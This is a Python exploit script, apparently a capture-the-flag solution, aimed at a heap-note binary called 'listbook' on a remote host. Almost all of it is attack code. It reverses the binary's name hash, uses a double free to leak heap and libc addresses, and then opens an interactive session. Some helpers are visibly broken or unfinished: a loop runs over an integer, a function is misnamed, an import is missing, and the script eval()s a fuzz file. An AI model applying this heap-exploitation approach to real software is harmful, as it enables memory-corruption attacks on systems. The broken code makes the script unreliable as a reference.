#!/usr/bin/env python3
# -*- coding: utf-8 -*-
__MODE__="PWN"
from rootkit import *
import random

exe = context.binary = ELF('./listbook')

host = args.HOST or '111.186.58.249'
port = int(args.PORT or 20001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
# b *0x555555555651
# b *0x55555555538f
break *0x555555555568
# set $name_buf = 0x555555558840
set $kek = 0x840
continue
'''.format(**locals())

# -- Exploit goes here --

"""
   0x55555555538f    movzx  eax, byte ptr sum_of_inp
   0x555555555393    sar    al, 7
   0x555555555396    mov    edx, eax
   0x555555555398    mov    eax, edx
 ► 0x55555555539a    xor    al, byte ptr sum_of_inp
   0x55555555539d    sub    eax, edx
   0x55555555539f    mov    byte ptr sum_of_inp, al
   0x5555555553a2    cmp    byte ptr sum_of_inp, 0xf
   0x5555555553a6    jle    0x5555555553be <0x5555555553be>

"""

def abs8(sum_of_inp):
    eax = 0x10
    eax = 0x000000FF & sum_of_inp # movzx  eax, byte ptr sum_of_inp
    eax = int(subprocess.check_output(['./kek', str(eax)]).strip(b'\n'))
    print(eax)
    # eax = eax >> 7 # sar    al, 7

    edx = eax # mov    edx, eax
    eax = edx # mov    eax, edx
    eax = eax ^ (0x000000FF & sum_of_inp) # xor    al, byte ptr sum_of_inp
    eax = eax - edx # sub    eax, edx
    # print(f"0x55555555539f : eax : {hex(eax)}")
    # print(f"0x55555555538f : rbp - 5 : {hex(sum_of_inp)}")
    # kek = int(str(str(sum_of_inp)[:-2]) + str(eax)) # mov    byte ptr sum_of_inp, al
    # print(f"0x55555555539f : eax : {hex(eax)}")
    # print(f"0x55555555538f : rbp - 5 : {hex(sum_of_inp)}")
    return eax

def hash_(inp):
    # take the sum of all input
    # inp = inp + "\n"
    inp = inp.ljust(0x10, "\x00")
    sum_of_inp = 0
    for i in range(0x10):
        sum_of_inp += ord(inp[i])
    kek = abs8(sum_of_inp)
    if (kek > 15):
        kek %= 16
    print(f"HASH : {hex(kek)}")
    return kek

def reverse_hash(idx):
    rev_mapping = defaultdict(list)
    print(rev_mapping)
    for r in 0x100:
        rev_mapping[hash(r)].append(r)

def option(choice):
    sla(">>", str(choice))

def add(name, content):
    option(1)
    # hash_(name)
    sla("name>", name)
    sla("content>", content)

def delete(idx):
    option(2)
    sla("index>", str(idx))
    if b"empty" not in rl():
        print(f"{idx} deleted")

def attack(buf):
    option(1)
    re()
    sl(buf)

def show(idx):
    option(3)
    sla("index>", str(idx))

def print_all():
    for i in range(16):
        show(i)

def delete_all():
    for i in range(16):
        delete(i)

io = start()
libc = ELF(exe.libc.path)
hash1 = {0: 'AAAAAAAAAAAAAAò', 1: 'AAAAAAAAAAAAAAõ', 2: 'AAAAAAAAAAAAAAô', 3: 'AAAAAAAAAAAAAA÷', 4: 'AAAAAAAAAAAAAAö', 5: 'AAAAAAAAAAAAAAù', 6: 'AAAAAAAAAAAAAAø', 7: 'AAAAAAAAAAAAAAû', 8: 'AAAAAAAAAAAAAAú', 9: 'AAAAAAAAAAAAAAý', 10: 'AAAAAAAAAAAAAAü', 11: 'AAAAAAAAAAAAAAí', 12: 'AAAAAAAAAAAAAAþ', 13: 'AAAAAAAAAAAAAAï', 14: 'AAAAAAAAAAAAAAð', 15: 'AAAAAAAAAAAAAAó'}
hash2 = {0: 'AAAAAAAAAAAAAòA', 1: 'AAAAAAAAAAAAAõA', 2: 'AAAAAAAAAAAAAôA', 3: 'AAAAAAAAAAAAA÷A', 4: 'AAAAAAAAAAAAAöA', 5: 'AAAAAAAAAAAAAùA', 6: 'AAAAAAAAAAAAAøA', 7: 'AAAAAAAAAAAAAûA', 8: 'AAAAAAAAAAAAAúA', 9: 'AAAAAAAAAAAAAýA', 10: 'AAAAAAAAAAAAAüA', 11: 'AAAAAAAAAAAAAíA', 12: 'AAAAAAAAAAAAAþA', 13: 'AAAAAAAAAAAAAïA', 14: 'AAAAAAAAAAAAAðA', 15: 'AAAAAAAAAAAAAóA'}
f=open("fuzz_dict.txt", "r").read()
fuzz=eval(f)
fuzz=dict(sorted(fuzz.items()))
add("AAAAAAAAAAAAAMÆ", "A"*0x200) # idx 0
add("AAAAAAAAAAAAAMÇ", "A"*0x200) # idx 1
delete(0)
delete(1)
add(hash1[0], "A"*0x200) # double free idx 0
add("AAAAAAAAAAAAAM%", "A"*0x200) # double free idx 1
add("AAAAAAAAAAAAAM%", "A"*0x200) # double free idx 1
delete(1)
add("AAAAAAAAAAAAAM%", "A"*0x200) # double free idx 1
add("AAAAAAAAAAAAAM7", "A"*0x200)  # idx 0xf
add("AAAAAAAAAAAAAMC", "A"*0x200)  # 0xe
delete(1)
delete(2)
delete(0)
show(15)
reu("=> ")
heap_base = u64_bytes(6) - 0x510
for i in range(8):
    add(b'a'*7, "A"*0x200) # idx 2
delete(9)
show(15)
reu("=> ")
libc.address = u64_bytes(6) - 0x1c6be0
log.info(f"Heap base : {hex(heap_base)}")
log.info(f"Libc base : {hex(libc.address)}")
add(hash1[0], "A"*0x200)
print_all()
pause()
delete(0)
delete(1)
add("Z"*15, "A"*0x200)
io.interactive()

